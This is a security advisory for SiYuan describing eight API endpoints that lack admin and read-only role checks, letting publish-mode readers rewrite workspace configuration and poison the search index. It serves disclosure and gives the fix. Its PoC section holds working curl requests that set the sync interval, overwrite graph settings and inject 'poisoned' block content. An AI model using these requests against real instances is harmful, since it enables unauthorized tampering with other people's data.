# [H] SiYuan publish-mode Reader can mutate Conf and SQL index via 8 ungated APIs

## Summary
Severity: High
Advisory: GHSA-gmmv-4cc5-wr9r
CVE: CVE-2026-45371
CWE: CWE-285, CWE-862
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:H/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-13
Source: https://github.com/advisories/GHSA-gmmv-4cc5-wr9r
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0 <0.0.0-20260512140701-d7b77d945e0d

## Details
### Summary

SiYuan publish-mode Reader can mutate Conf and SQL index via 8 ungated APIs

`POST /api/graph/getGraph`, `POST /api/graph/getLocalGraph`, `POST /api/sync/setSyncInterval`, `POST /api/storage/updateRecentDocViewTime`, `POST /api/storage/updateRecentDocCloseTime`, `POST /api/storage/updateRecentDocOpenTime`, `POST /api/storage/batchUpdateRecentDocCloseTime`, and `POST /api/search/updateEmbedBlock` are registered with `model.CheckAuth` only, omitting both `model.CheckAdminRole` and `model.CheckReadonly`. Each of them writes server-side state, including atomic rewrites of `<workspace>/conf/conf.json` via `model.Conf.Save()`. Any caller whose JWT passes `CheckAuth`, including a publish-service `RoleReader` (the role assigned to anonymous publish visitors) and a `RoleEditor` against a workspace where `Editor.ReadOnly = true`, can hit them. This is the same root-cause class as the patched `GHSA-6r88-8v7q-q4p2` and `GHSA-4j3x-hhg2-fm2x`.

### Details

Affected: github.com/siyuan-note/siyuan, all tags up to and including v3.6.5 (HEAD `96dfe0be`).

The router in `kernel/api/router.go` registers each endpoint below with `model.CheckAuth` only. Sibling endpoints in the same group are correctly gated, which makes the omission unambiguous:

```bash
kernel/api/router.go:87 /api/storage/updateRecentDocViewTime CheckAuth only
kernel/api/router.go:88 /api/storage/updateRecentDocCloseTime CheckAuth only
kernel/api/router.go:89 /api/storage/batchUpdateRecentDocCloseTime CheckAuth only
kernel/api/router.go:90 /api/storage/updateRecentDocOpenTime CheckAuth only
kernel/api/router.go:188 /api/search/updateEmbedBlock CheckAuth only
kernel/api/router.go:279 /api/sync/setSyncInterval CheckAuth only
kernel/api/router.go:400 /api/graph/getGraph CheckAuth only
kernel/api/router.go:401 /api/graph/getLocalGraph CheckAuth only

# Compare the gated siblings on adjacent lines:
kernel/api/router.go:278 /api/sync/setSyncEnable CheckAuth, CheckAdminRole, CheckReadonly
kernel/api/router.go:280 /api/sync/setSyncPerception CheckAuth, CheckAdminRole, CheckReadonly
kernel/api/router.go:281 /api/sync/setSyncGenerateConflictDoc CheckAuth, CheckAdminRole, CheckReadonly
kernel/api/router.go:398 /api/graph/resetGraph CheckAuth, CheckAdminRole, CheckReadonly
kernel/api/router.go:399 /api/graph/resetLocalGraph CheckAuth, CheckAdminRole, CheckReadonly
```

Per-handler evidence:

`kernel/api/graph.go:53` `getGraph`. Despite the verb "get", the body unconditionally overwrites `model.Conf.Graph.Global` from caller-supplied JSON and persists the entire workspace `conf.json`:

```
graphConf, err := gulu.JSON.MarshalJSON(confArg)
...
global := conf.NewGlobalGraph()
gulu.JSON.UnmarshalJSON(graphConf, global)
model.Conf.Graph.Global = global // attacker-controlled write
model.Conf.Save() // atomic rewrite of conf.json
```

`kernel/api/graph.go:106` `getLocalGraph`. Same pattern on `model.Conf.Graph.Local`. Note the legitimate writers `resetGraph` (`graph.go:29`) and `resetLocalGraph` (`graph.go:41`) only set the struct to its constructor default (`NewGlobalGraph()` / `NewLocalGraph()`), whereas `getGraph` / `getLocalGraph` accept the entire struct from the caller, so the unauthorized surface is strictly larger than the gated reset endpoints.

`kernel/api/sync.go:597` `setSyncInterval`. Calls `model.SetSyncInterval(int(interval))` (`kernel/model/sync.go:394`) which writes `Conf.Sync.Interval`, persists `Conf.Save()`, and reschedules the sync goroutine via `planSyncAfter`. The model layer clamps the interval to `[30, 43200]`, but a Reader can still pin sync to either bound (30 s for battery and bandwidth pressure on every connected client, or 12 h to effectively suspend cloud sync without changing the UI toggle).

`kernel/api/search.go:287` `updateEmbedBlock`. Calls `model.UpdateEmbedBlock(id, content)` (`kernel/model/search.go:198`), which validates only that the block type is `BlockQueryEmbed` and then forwards to `updateEmbedBlockContent` (`kernel/model/index.go:342`). That helper rewrites the SQL `blocks` row's `content` column for the given embed-block ID via `sql.UpdateBlockContentQueue`. There is no publish-access check, so any embed block ID anywhere in the workspace is writable. The SQL `content` column is what `fullTextSearchBlock` and `getEmbedBlock` read from, so a Reader can poison search results visible to other users.

`kernel/api/storage.go:251,295,273,317` `updateRecentDocViewTime` / `updateRecentDocCloseTime` / `updateRecentDocOpenTime` / `batchUpdateRecentDocCloseTime`. Each rewrites the workspace recent-docs JSON file under `recentDocLock` (`kernel/model/storage.go:171,213` ...). A Reader can register any `rootID` (including IDs in publish-private notebooks) into the recent-docs list, manipulating the admin's recently-opened-documents UI and history.

The bugs have all existed since v3.6.5 (the active release tag) and the live `master` branch. Two adjacent advisories already patched the exact same shape: `GHSA-6r88-8v7q-q4p2` (`getTag` writing `Conf.Tag.Sort`) and `GHSA-4j3x-hhg2-fm2x` (`renderSprig` missing `CheckAdminRole + CheckReadonly`). Both are listed by the maintainers as occurrences "the same root-cause class" that has to be patched per-occurrence, so this report enumerates the remaining occurrences in one pass.

### PoC

Source-level reproduction. The same Docker compose lab the maintainers used for `GHSA-6r88` works here:

```bash
# 1. Authenticate as any role with CheckAuth (admin used here for convenience;
# a publish-mode Reader JWT works equivalently).
curl -s -c /tmp/sy.cookie -X POST http://127.0.0.1:6806/api/system/loginAuth \
 -H 'Content-Type: application/json' -d '{"authCode":"audittest"}' >/dev/null

# 2. Read current Conf.Sync.Interval and Conf.Graph.Global from /api/system/getConf.
curl -s -b /tmp/sy.cookie -X POST http://127.0.0.1:6806/api/system/getConf \
 -H 'Content-Type: application/json' -d '{}' \
 | python3 -c "import json,sys;c=json.load(sys.stdin)['data']['conf'];\
print('Conf.Sync.Interval BEFORE =',c['sync']['interval']);\
print('Conf.Graph.Global.minRefs BEFORE =',c['graph']['global']['minRefs'])"

# 3. setSyncInterval as Reader.
curl -s -b /tmp/sy.cookie -X POST http://127.0.0.1:6806/api/sync/setSyncInterval \
 -H 'Content-Type: application/json' -d '{"interval":30}'

# 4. getGraph as Reader, supplying a custom graph config struct.
curl -s -b /tmp/sy.cookie -X POST http://127.0.0.1:6806/api/graph/getGraph \
 -H 'Content-Type: application/json' \
 -d '{"k":"","conf":{"minRefs":99,"maxBlocks":1,"d3":{"linkWidth":99}}}'

# 5. Confirm in-memory and on-disk persistence.
curl -s -b /tmp/sy.cookie -X POST http://127.0.0.1:6806/api/system/getConf \
 -H 'Content-Type: application/json' -d '{}' \
 | python3 -c "import json,sys;c=json.load(sys.stdin)['data']['conf'];\
print('Conf.Sync.Interval AFTER =',c['sync']['interval']);\
print('Conf.Graph.Global.minRefs AFTER =',c['graph']['global']['minRefs'])"

docker exec siyuan-audit grep -oE '\"interval\":[0-9]+' /siyuan/workspace/conf/conf.json
docker exec siyuan-audit grep -oE '\"minRefs\":[0-9]+' /siyuan/workspace/conf/conf.json

# 6. updateEmbedBlock - rewrite SQL content for any embed block ID.
curl -s -b /tmp/sy.cookie -X POST http://127.0.0.1:6806/api/search/updateEmbedBlock \
 -H 'Content-Type: application/json' \
 -d '{"id":"<embed-block-id>","content":"poisoned"}'
```

Source-level proof, no privileged token involved:

```bash
$ grep -nE 'ginServer\.Handle.*(getGraph|getLocalGraph|setSyncInterval|updateEmbedBlock|updateRecentDoc|batchUpdateRecentDocCloseTime)' \
 kernel/api/router.go \
 | grep -vE 'CheckAdminRole|CheckReadonly'
kernel/api/router.go:87: ... /api/storage/updateRecentDocViewTime", model.CheckAuth, ...
kernel/api/router.go:88: ... /api/storage/updateRecentDocCloseTime", model.CheckAuth, ...
kernel/api/router.go:89: ... /api/storage/batchUpdateRecentDocCloseTime", model.CheckAuth, ...
kernel/api/router.go:90: ... /api/storage/updateRecentDocOpenTime", model.CheckAuth, ...
kernel/api/router.go:188: ... /api/search/updateEmbedBlock", model.CheckAuth, ...
kernel/api/router.go:279: ... /api/sync/setSyncInterval", model.CheckAuth, ...
kernel/api/router.go:400: ... /api/graph/getGraph", model.CheckAuth, ...
kernel/api/router.go:401: ... /api/graph/getLocalGraph", model.CheckAuth, ...
```

Standing up the publish-mode Reader path end-to-end was not done in this audit; the source-level diff against the gated siblings and the prior advisories' fix pattern are the same evidence the maintainers accepted for `GHSA-fmh9-gpqh-g53g` and `GHSA-6r88-8v7q-q4p2` published 2026-05-08.

### Impact

A publish-mode Reader (default for any anonymous publish visitor) and a publish-mode Editor against a `Editor.ReadOnly = true` workspace can:

1. Atomically rewrite `<workspace>/conf/conf.json` via `Conf.Save()` from `setSyncInterval`, `getGraph`, `getLocalGraph`. `Conf.Save()` rewrites the entire file, so a Reader racing with a legitimate admin save can revert unrelated configuration changes the admin made in the same window.
2. Set the cloud sync interval to either bound of the `[30, 43200]` clamp. 30 s pins clients to the worst-case sync hammer, draining battery and bandwidth on every connected device. 43200 s effectively pauses cloud sync for the workspace without flipping the visible "Sync enabled" toggle, increasing the chance of data divergence between devices and decreasing the likelihood that a Reader-induced state corruption is caught quickly.
3. Overwrite `Conf.Graph.Global` and `Conf.Graph.Local` with a caller-controlled struct, breaking graph rendering for the admin (extreme `maxBlocks`, `minRefs`, `nodeSize`, etc.). The reset endpoints at the same path are gated behind admin role specifically because the maintainers considered graph configuration a privileged setting.
4. Poison the SQL `blocks.content` column for any embed-block ID via `updateEmbedBlock`. Search functions that read the SQL index (`fullTextSearchBlock`, `getEmbedBlock`) return the poisoned content to other users, so a Reader can plant content other users will see.
5. Manipulate the recent-documents list seen by the admin via the four `updateRecentDoc*` writers, including registering IDs from publish-private notebooks (information disclosure plus UI manipulation).

The fix is a one-token edit per registration: add `model.CheckAdminRole` and `model.CheckReadonly` to each affected `ginServer.Handle` call, mirroring the gated siblings and the patches for `GHSA-6r88-8v7q-q4p2` and `GHSA-4j3x-hhg2-fm2x`.

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-gmmv-4cc5-wr9r
- https://nvd.nist.gov/vuln/detail/CVE-2026-45371
- https://github.com/siyuan-note/siyuan
